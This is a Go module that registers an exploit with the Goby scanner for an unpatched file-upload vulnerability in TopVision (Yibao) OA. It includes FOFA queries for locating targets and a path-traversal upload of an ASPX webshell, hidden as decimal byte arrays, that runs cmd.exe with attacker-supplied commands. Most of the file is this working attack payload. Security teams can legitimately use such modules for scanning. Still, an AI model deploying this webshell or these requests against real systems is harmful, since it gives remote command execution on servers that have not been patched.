package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "TopVision OA UploadFile File Creation",
    "Description": "<p>TopVision OA is a very powerful mobile office software. It not only provides a better work calendar for the majority of users, but also everyone can record important matters here, and the software also has a better check-in The system allows users to quickly record their work hours, and it will be easier to adjust shifts and make up cards, so that your work activity will be improved. This product has a file creation vulnerability, which can be written to the Webshell to obtain server permissions.</p>",
    "Product": "Topvision-Yibao-OA",
    "Homepage": "http://www.its365.net/products.aspx/",
    "DisclosureDate": "2022-12-03",
    "Author": "1angx",
    "FofaQuery": "title=\"欢迎登录易宝OA系统\"|| banner=\"易宝OA\"",
    "GobyQuery": "title=\"欢迎登录易宝OA系统\"|| banner=\"易宝OA\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to write arbitrary files and gain server privileges by writing to the webshell.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.its365.net\">http://www.its365.net</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/files/UploadFile",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "token=zxh&FileName=/../../manager/z.aspx&pathType=1&fs=[60,37,64,80,97,103,101,32,76,97,110,103,117,97,103,101,61,34,67,35,34,37,62,10,60,37,10,82,101,115,112,111,110,115,101,46,87,114,105,116,101,40,70,111,114,109,115,65,117,116,104,101,110,116,105,99,97,116,105,111,110,46,72,97,115,104,80,97,115,115,119,111,114,100,70,111,114,83,116,111,114,105,110,103,73,110,67,111,110,102,105,103,70,105,108,101,40,34,116,101,115,116,49,50,51,34,44,32,34,77,68,53,34,41,41,59,10,83,121,115,116,101,109,46,73,79,46,70,105,108,101,46,68,101,108,101,116,101,40,82,101,113,117,101,115,116,46,80,104,121,115,105,99,97,108,80,97,116,104,41,59,10,37,62]\n"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "success",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/z.aspx",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "CC03E747A6AFBBCBF8BE7668ACFEBEE5",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/files/UploadFile",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "token=zxh&FileName=/../../manager/z.aspx&pathType=1&fs=[60,37,64,32,80,97,103,101,32,76,97,110,103,117,97,103,101,61,34,74,115,99,114,105,112,116,34,32,118,97,108,105,100,97,116,101,82,101,113,117,101,115,116,61,34,102,97,108,115,101,34,32,37,62,10,60,37,10,118,97,114,32,99,61,110,101,119,32,83,121,115,116,101,109,46,68,105,97,103,110,111,115,116,105,99,115,46,80,114,111,99,101,115,115,83,116,97,114,116,73,110,102,111,40,34,99,109,100,34,41,59,10,118,97,114,32,101,61,110,101,119,32,83,121,115,116,101,109,46,68,105,97,103,110,111,115,116,105,99,115,46,80,114,111,99,101,115,115,40,41,59,10,118,97,114,32,111,117,116,58,83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,82,101,97,100,101,114,44,69,73,58,83,121,115,116,101,109,46,73,79,46,83,116,114,101,97,109,82,101,97,100,101,114,59,10,99,46,85,115,101,83,104,101,108,108,69,120,101,99,117,116,101,61,102,97,108,115,101,59,10,99,46,82,101,100,105,114,101,99,116,83,116,97,110,100,97,114,100,79,117,116,112,117,116,61,116,114,117,101,59,10,99,46,82,101,100,105,114,101,99,116,83,116,97,110,100,97,114,100,69,114,114,111,114,61,116,114,117,101,59,10,101,46,83,116,97,114,116,73,110,102,111,61,99,59,10,99,46,65,114,103,117,109,101,110,116,115,61,34,47,99,32,34,32,43,32,82,101,113,117,101,115,116,46,73,116,101,109,91,34,99,109,100,34,93,59,10,101,46,83,116,97,114,116,40,41,59,10,111,117,116,61,101,46,83,116,97,110,100,97,114,100,79,117,116,112,117,116,59,10,69,73,61,101,46,83,116,97,110,100,97,114,100,69,114,114,111,114,59,10,101,46,67,108,111,115,101,40,41,59,10,82,101,115,112,111,110,115,101,46,87,114,105,116,101,40,111,117,116,46,82,101,97,100,84,111,69,110,100,40,41,32,43,32,69,73,46,82,101,97,100,84,111,69,110,100,40,41,41,59,10,83,121,115,116,101,109,46,73,79,46,70,105,108,101,46,68,101,108,101,116,101,40,82,101,113,117,101,115,116,46,80,104,121,115,105,99,97,108,80,97,116,104,41,59,10,82,101,115,112,111,110,115,101,46,69,110,100,40,41,59,37,62]"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/z.aspx",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "cmd={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(?s)(.*)"
            ]
        }
    ],
    "Tags": [
        "File Creation"
    ],
    "VulType": [
        "File Creation"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "易宝OA  UploadFile 文件创建漏洞",
            "Product": "顶讯科技-易宝OA系统",
            "Description": "<p>易宝OA是一款非常强大的手机办公软件，这里不仅为广大的用户提供了一个更好的工作日历，而且每个人都可以在这里进行重要事项的记录，同时软件中还拥有更好的打卡系统，让用户可以快速记录自己的工作时常，而且调班与补卡也会更加的简单，让你工作活跃度得到提升。该产品存在文件创建漏洞，可写入Webshell获取服务器权限。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.its365.net/products.aspx\">http://www.its365.net/products.aspx</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞写入任意文件，通过写入webshell获取服务器权限。<br></p>",
            "VulType": [
                "文件创建"
            ],
            "Tags": [
                "文件创建"
            ]
        },
        "EN": {
            "Name": "TopVision OA UploadFile File Creation",
            "Product": "Topvision-Yibao-OA",
            "Description": "<p>TopVision OA is a very powerful mobile office software. It not only provides a better work calendar for the majority of users, but also everyone can record important matters here, and the software also has a better check-in The system allows users to quickly record their work hours, and it will be easier to adjust shifts and make up cards, so that your work activity will be improved. This product has a file creation vulnerability, which can be written to the Webshell to obtain server permissions.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.its365.net\">http://www.its365.net</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to write arbitrary files and gain server privileges by writing to the webshell.<br></p>",
            "VulType": [
                "File Creation"
            ],
            "Tags": [
                "File Creation"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
